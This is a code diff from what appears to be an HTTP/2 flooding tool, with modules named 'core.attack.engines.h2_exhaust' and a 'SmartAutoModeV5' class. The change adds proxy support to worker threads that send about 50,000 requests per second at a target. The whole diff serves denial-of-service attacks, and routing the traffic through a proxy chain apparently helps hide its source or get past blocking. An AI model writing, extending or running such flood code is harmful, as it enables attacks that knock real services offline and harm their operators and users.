@@ -50,7 +50,8 @@ STATUS_LOG_PATH = "logs/auto_mode_v3_status.json"
 
 def _run_h2_worker_fallback(target: str, duration: int, rps: int,
                              worker_id: int, stats_queue, stop_event,
-                             host_header: str = "", result_dict: dict = None):
+                             host_header: str = "", result_dict: dict = None,
+                             proxy_url: str = ""):
     """Thread target for Python H2 exhaust fallback in V5."""
     try:
         from core.attack.engines.h2_exhaust import run_h2_exhaust
@@ -58,7 +59,7 @@ def _run_h2_worker_fallback(target: str, duration: int, rps: int,
             target_url=target, rps=rps, duration=float(duration),
             worker_id=worker_id, stats_queue=stats_queue, stop_event=stop_event,
             host_header=host_header or None, connections=4,
-            result_dict=result_dict,
+            result_dict=result_dict, proxy_url=proxy_url,
         )
     except ImportError:
         try:
@@ -2336,12 +2337,12 @@ class SmartAutoModeV5(SmartAutoModeV3):
                 for wi in range(num_workers):
                     h2_result = {}
                     th = threading.Thread(
-                        target=lambda: _run_h2_worker_fallback(
+                        target=lambda pw=self.proxy_chain: _run_h2_worker_fallback(
                             target=py_target, duration=self.duration,
                             rps=50000, worker_id=1000 + wi,
                             stats_queue=h2_stats_q, stop_event=h2_stop,
                             host_header=py_host_header,
-                            result_dict=h2_result,
+                            result_dict=h2_result, proxy_url=pw,
                         ),
                         daemon=True,
                     )
